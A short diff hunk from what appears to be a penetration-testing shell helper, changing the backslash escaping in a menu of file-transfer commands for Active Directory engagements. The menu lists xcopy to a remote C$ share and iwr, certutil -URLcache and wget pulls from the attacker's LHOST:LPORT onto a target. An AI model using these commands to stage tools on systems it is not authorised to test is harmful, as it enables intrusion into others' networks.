@@ -900,7 +900,7 @@ nb-ad-pwsh-file-download() {
             # Commands for downloading to disk
             echo
             __ask "Choose a command to copy:"
-            echo "1. echo F | xcopy C:\\AD\\Tools\\$filename \\\\<RHOST>\\C$\\Users\\Public\\$filename /Y"
+            echo "1. echo F | xcopy C:\\\\AD\\\\Tools\\\\$filename \\\\<RHOST>\\C$\\\\Users\\\\Public\\\\$filename /Y"
             echo "2. iwr http://${__LHOST}:${__LPORT}/$filename -OutFile $filename"
             echo "3. certutil -URLcache -split -f http://${__LHOST}:${__LPORT}/$filename C:\\Windows\\Temp\\$filename"
             echo "4. wget http://${__LHOST}:${__LPORT}/$filename -O $filename"
